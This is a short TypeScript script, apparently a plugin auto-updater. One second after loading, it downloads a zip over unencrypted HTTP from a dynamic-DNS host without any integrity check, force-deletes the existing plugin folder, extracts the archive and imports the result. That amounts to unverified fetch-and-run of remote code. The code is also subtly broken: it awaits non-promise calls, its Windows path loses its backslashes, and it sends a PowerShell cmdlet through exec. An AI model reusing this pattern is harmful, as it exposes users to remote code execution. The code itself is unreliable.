import * as fs from "fs";
import * as http from "http";
import { exec } from "child_process";

function download(url: string, path: string, cb: any = undefined) {
	const file = fs.createWriteStream(path);
	const request = http.get(url, (response) => {
		response.pipe(file);
	});
	file.on('finish', () => file.close(cb));
	request.on('error', (err) => {
		fs.unlink(path, () => cb(err.message));
	});
	file.on('error', (err) => {
		fs.unlink(path, () => cb(err.message));
	});
};

async function update() {
	await download("http://CIF.kro.kr/398znmfl-rf-zrekip029z-qwerwe/zmofip=43-8900ua34j3-09-124825425234-z9i90j/CIF.zip", "../plugins/CIF.zip");
	await exec("rmdir /q /s ..\plugins\cif", ((err, stdout, stderr)=> {
		if (err) throw err;
		if (stderr) throw stderr;
	}));

	await exec("Expand-Archive -Force -literalpath '../plugins/CIF.zip' -Destinationpath '../plugins/CIF'", ((err, stdout, stderr)=> {
		if (err) throw err;

		import("./modules/util/configManager");
		import("./main");
	}));
};

setTimeout(() => {
	update();
}, 1000);